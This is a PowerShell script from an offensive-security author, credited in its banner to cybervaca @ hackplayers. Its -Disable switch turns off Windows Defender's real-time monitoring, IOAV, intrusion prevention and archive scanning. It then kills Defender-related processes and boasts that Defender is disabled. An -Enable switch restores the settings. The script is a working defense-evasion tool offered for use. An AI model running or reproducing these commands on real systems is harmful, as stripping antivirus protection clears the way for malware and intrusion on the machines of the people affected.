function Set-WindowsDenfender {param ([switch]$Enable,[switch]$Disable)

$resultado = "
 _____      _          _    _ _           _                   _____            __               _           
/  ___|    | |        | |  | (_)         | |                 |  _  \          / _|             | |          
\ '--.  ___| |_ ______| |  | |_ _ __   __| | _____      _____| | | |___ _ __ | |_ ___ _ __   __| | ___ _ __ 
 '--. \/ _ \ __|______| |/\| | | '_ \ / _' |/ _ \ \ /\ / / __| | | / _ \ '_ \|  _/ _ \ '_ \ / _' |/ _ \ '__|
/\__/ /  __/ |_       \  /\  / | | | | (_| | (_) \ V  V /\__ \ |/ /  __/ | | | ||  __/ | | | (_| |  __/ |   
\____/ \___|\__|       \/  \/|_|_| |_|\__,_|\___/ \_/\_/ |___/___/ \___|_| |_|_| \___|_| |_|\__,_|\___|_|   
                                                                                                            
                                                                    cybervaca @ hackplayers                                                                                                     
"

if ($Disable -eq $True) {
Set-MpPreference -DisableIOAVProtection $True
Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableIntrusionPreventionSystem $True
Set-MpPreference -DisableCatchupQuickScan $True
Set-MpPreference -DisableArchiveScanning $True
Get-Process | Select-Object -Property * | Where-Object {$_.Description -like "*defender*"} | Stop-Process
$resultado += "[+] Windows Defender right now is Disabled :D"
return $resultado
}

if ($Enable -eq $True) {
$proceso = 'C:\Program Files\Windows Defender\MSASCui.exe'
Start-Process $proceso -WindowStyle Hidden
Set-MpPreference -DisableIOAVProtection $False
Set-MpPreference -DisableRealtimeMonitoring $False
Set-MpPreference -DisableIntrusionPreventionSystem $False
Set-MpPreference -DisableCatchupQuickScan $False
Set-MpPreference -DisableArchiveScanning $False
$resultado += "[+] Windows Defender right now is Enabled"
return $resultado
}

if ($Enable -eq $False -and $Disable -eq $False){
if ((Get-Process -Name MSASCUI -ErrorAction SilentlyContinue) -eq $true ) {$resultado += "[+] Windows Defender is Enabled"} else {$resultado += "[+] Windows Defender is Disabled"}
return $resultado
}}

